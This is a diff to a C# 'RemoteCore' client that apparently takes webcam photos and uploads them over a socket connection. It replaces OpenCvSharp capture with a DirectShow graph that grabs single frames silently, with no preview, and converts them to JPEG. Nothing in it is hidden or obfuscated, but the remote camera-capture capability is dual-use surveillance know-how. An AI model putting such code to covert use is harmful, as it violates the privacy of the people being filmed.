@@ -13,7 +13,7 @@ using System.Text.Json;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using SocketIOClient;
-using OpenCvSharp;
+using DirectShowLib;
 using System.Text;
 using System.Linq;
 
@@ -211,25 +211,14 @@ namespace RemoteCore
             Console.WriteLine("Initializing camera...");
             try
             {
-                // 尝试初始化摄像头
-                using var capture = new VideoCapture(0, VideoCaptureAPIs.ANY);
-                if (capture.IsOpened())
+                _cameraInitialized = HasCameraDevice();
+                if (_cameraInitialized)
                 {
-                    capture.Set(VideoCaptureProperties.FrameWidth, 1280);
-                    capture.Set(VideoCaptureProperties.FrameHeight, 720);
-                    capture.Set(VideoCaptureProperties.Fps, 30);
-                    
-                    using var image = new Mat();
-                    bool ret = capture.Read(image);
-                    if (ret && !image.Empty())
-                    {
-                        Console.WriteLine("Camera initialized successfully");
-                        _cameraInitialized = true;
-                        return true;
-                    }
+                    Console.WriteLine("Camera initialized successfully");
+                    return true;
                 }
+
                 Console.WriteLine("Failed to initialize camera");
-                _cameraInitialized = false;
                 return false;
             }
             catch (Exception ex)
@@ -237,6 +226,162 @@ namespace RemoteCore
                 Console.WriteLine($"Error initializing camera: {ex.Message}");
                 _cameraInitialized = false;
                 return false;
+            }
+        }
+
+        private static bool HasCameraDevice()
+        {
+            try
+            {
+                var devices = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
+                return devices != null && devices.Length > 0;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        private static byte[] CaptureJpegFromDefaultCamera(int captureTimeoutMs = 8000)
+        {
+            byte[]? result = null;
+            Exception? error = null;
+            var t = new Thread(() =>
+            {
+                try
+                {
+                    result = CaptureJpegFromDefaultCameraSta(captureTimeoutMs);
+                }
+                catch (Exception ex)
+                {
+                    error = ex;
+                }
+            });
+            t.IsBackground = true;
+            t.SetApartmentState(ApartmentState.STA);
+            t.Start();
+            if (!t.Join(captureTimeoutMs + 2000))
+            {
+                throw new TimeoutException("Camera capture timeout");
+            }
+            if (error != null) throw error;
+            if (result == null || result.Length == 0) throw new Exception("Failed to capture camera frame");
+            return result;
+        }
+
+        private static byte[] CaptureJpegFromDefaultCameraSta(int captureTimeoutMs)
+        {
+            var devices = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
+            if (devices == null || devices.Length == 0) throw new Exception("No camera device found");
+
+            IGraphBuilder graph = null!;
+            ICaptureGraphBuilder2 builder = null!;
+            IBaseFilter source = null!;
+            IBaseFilter grabberFilter = null!;
+            ISampleGrabber sampleGrabber = null!;
+            IBaseFilter nullRenderer = null!;
+            IMediaControl control = null!;
+            IMediaEventEx mediaEvent = null!;
+
+            var mt = new AMMediaType();
+            mt.majorType = MediaType.Video;
+            mt.subType = MediaSubType.RGB24;
+            mt.formatType = FormatType.VideoInfo;
+
+            try
+            {
+                graph = (IGraphBuilder)new FilterGraph();
+                builder = (ICaptureGraphBuilder2)new CaptureGraphBuilder2();
+                builder.SetFiltergraph(graph);
+
+                graph.AddSourceFilterForMoniker(devices[0].Mon, null, devices[0].Name, out source);
+
+                sampleGrabber = (ISampleGrabber)new SampleGrabber();
+                sampleGrabber.SetMediaType(mt);
+                grabberFilter = (IBaseFilter)sampleGrabber;
+                graph.AddFilter(grabberFilter, "SampleGrabber");
+
+                nullRenderer = (IBaseFilter)new NullRenderer();
+                graph.AddFilter(nullRenderer, "NullRenderer");
+
+                int hr = builder.RenderStream(PinCategory.Capture, MediaType.Video, source, grabberFilter, nullRenderer);
+                DsError.ThrowExceptionForHR(hr);
+
+                hr = sampleGrabber.SetOneShot(true);
+                DsError.ThrowExceptionForHR(hr);
+                hr = sampleGrabber.SetBufferSamples(true);
+                DsError.ThrowExceptionForHR(hr);
+
+                control = (IMediaControl)graph;
+                mediaEvent = (IMediaEventEx)graph;
+                hr = control.Run();
+                DsError.ThrowExceptionForHR(hr);
+
+                hr = mediaEvent.WaitForCompletion(captureTimeoutMs, out _);
+                DsError.ThrowExceptionForHR(hr);
+
+                var connected = new AMMediaType();
+                hr = sampleGrabber.GetConnectedMediaType(connected);
+                DsError.ThrowExceptionForHR(hr);
+
+                var vih = (VideoInfoHeader)Marshal.PtrToStructure(connected.formatPtr, typeof(VideoInfoHeader))!;
+                int width = vih.BmiHeader.Width;
+                int height = vih.BmiHeader.Height;
+                int absHeight = Math.Abs(height);
+                bool bottomUp = height > 0;
+                int srcStride = width * (vih.BmiHeader.BitCount / 8);
+
+                int size = 0;
+                hr = sampleGrabber.GetCurrentBuffer(ref size, IntPtr.Zero);
+                DsError.ThrowExceptionForHR(hr);
+                var bufferPtr = Marshal.AllocCoTaskMem(size);
+                try
+                {
+                    hr = sampleGrabber.GetCurrentBuffer(ref size, bufferPtr);
+                    DsError.ThrowExceptionForHR(hr);
+
+                    var managed = new byte[size];
+                    Marshal.Copy(bufferPtr, managed, 0, size);
+
+                    using var bmp = new Bitmap(width, absHeight, PixelFormat.Format24bppRgb);
+                    var rect = new Rectangle(0, 0, width, absHeight);
+                    var bmpData = bmp.LockBits(rect, ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);
+                    try
+                    {
+                        for (int y = 0; y < absHeight; y++)
+                        {
+                            int srcRow = bottomUp ? (absHeight - 1 - y) : y;
+                            IntPtr dest = bmpData.Scan0 + y * bmpData.Stride;
+                            Marshal.Copy(managed, srcRow * srcStride, dest, srcStride);
+                        }
+                    }
+                    finally
+                    {
+                        bmp.UnlockBits(bmpData);
+                    }
+
+                    using var ms = new MemoryStream();
+                    bmp.Save(ms, ImageFormat.Jpeg);
+                    return ms.ToArray();
+                }
+                finally
+                {
+                    Marshal.FreeCoTaskMem(bufferPtr);
+                    DsUtils.FreeAMMediaType(connected);
+                }
+            }
+            finally
+            {
+                try { control?.Stop(); } catch { }
+                DsUtils.FreeAMMediaType(mt);
+                if (mediaEvent != null) Marshal.ReleaseComObject(mediaEvent);
+                if (control != null) Marshal.ReleaseComObject(control);
+                if (nullRenderer != null) Marshal.ReleaseComObject(nullRenderer);
+                if (grabberFilter != null) Marshal.ReleaseComObject(grabberFilter);
+                if (sampleGrabber != null) Marshal.ReleaseComObject(sampleGrabber);
+                if (source != null) Marshal.ReleaseComObject(source);
+                if (builder != null) Marshal.ReleaseComObject(builder);
+                if (graph != null) Marshal.ReleaseComObject(graph);
             }
         }
 
@@ -312,58 +457,10 @@ namespace RemoteCore
                         return;
                     }
                 }
-                
-                // 拍摄照片
-                using var capture = new VideoCapture(0, VideoCaptureAPIs.ANY);
-                if (capture.IsOpened())
-                {
-                    // 拍摄前短暂等待，确保摄像头准备就绪
-                    await Task.Delay(500);
-                    
-                    // 连续读取3次，取最后一次结果以确保画面清晰
-                    Mat image = null!;
-                    try
-                    {
-                        for (int i = 0; i < 3; i++)
-                        {
-                            using var tempImage = new Mat();
-                            if (capture.Read(tempImage) && !tempImage.Empty())
-                            {
-                                if (image != null)
-                                {
-                                    image.Dispose();
-                                }
-                                image = tempImage.Clone();
-                            }
-                            await Task.Delay(100);
-                        }
-                        
-                        if (image != null && !image.Empty())
-                        {
-                            byte[] imageBytes = image.ToBytes(".jpg");
-                            await UploadPhotoAsync(imageBytes);
-                            Console.WriteLine("Photo taken and uploaded successfully");
-                        }
-                        else
-                        {
-                            Console.WriteLine("Failed to capture photo");
-                            // 尝试重新初始化摄像头
-                            _cameraInitialized = false;
-                        }
-                    }
-                    finally
-                    {
-                        if (image != null)
-                        {
-                            image.Dispose();
-                        }
-                    }
-                }
-                else
-                {
-                    Console.WriteLine("Failed to open camera");
-                    _cameraInitialized = false;
-                }
+
+                byte[] imageBytes = await Task.Run(() => CaptureJpegFromDefaultCamera());
+                await UploadPhotoAsync(imageBytes);
+                Console.WriteLine("Photo taken and uploaded successfully");
             }
             catch (Exception ex)
             {
